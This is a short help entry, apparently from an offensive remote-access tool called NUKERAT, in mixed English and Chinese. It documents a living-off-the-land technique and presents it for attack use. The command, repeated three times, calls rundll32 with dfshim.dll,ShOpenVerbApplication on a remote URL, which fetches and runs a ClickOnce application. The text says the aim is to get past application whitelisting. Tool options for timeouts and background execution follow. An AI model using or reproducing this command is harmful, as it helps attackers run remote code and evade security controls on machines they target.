    ClickOnce engine in Windows used by .NET. LOLBAS documents use
    binary to bypass Application whitelisting.

用法：
    rundll32.exe dfshim.dll,ShOpenVerbApplication {REMOTEURL}

示例：
    rundll32.exe dfshim.dll,ShOpenVerbApplication {REMOTEURL}

NUKERAT 选项：
    -w <秒数>       等待超时的最大时间
    -bg             后台运行，不等待输出

    rundll32.exe dfshim.dll,ShOpenVerbApplication {REMOTEURL}
